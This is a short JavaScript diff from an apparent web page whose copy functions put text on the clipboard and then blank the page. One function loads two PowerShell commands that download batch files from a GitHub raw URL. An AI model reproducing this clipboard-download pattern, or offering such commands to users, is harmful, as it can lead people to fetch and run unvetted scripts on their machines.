@@ -39,18 +39,17 @@ async function copy1() {
 
     await navigator.clipboard.writeText(text);
 
-    window.open('about:blank', '_blank');  
     location.replace('about:blank');  
 }
 
 async function copy2() {  
     const text =  
 `powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/JackAHP/Code-Blocks/main/NB.bat','NB.bat')"  
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/JackAHP/Code-Blocks/main/TaoProj.bat','TaoProj.bat')"`;
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/JackAHP/Code-Blocks/main/TaoProj.bat','TaoProj.bat')"
+`;
 
     await navigator.clipboard.writeText(text);
 
-    window.open('about:blank', '_blank');  
     location.replace('about:blank');  
 }
 
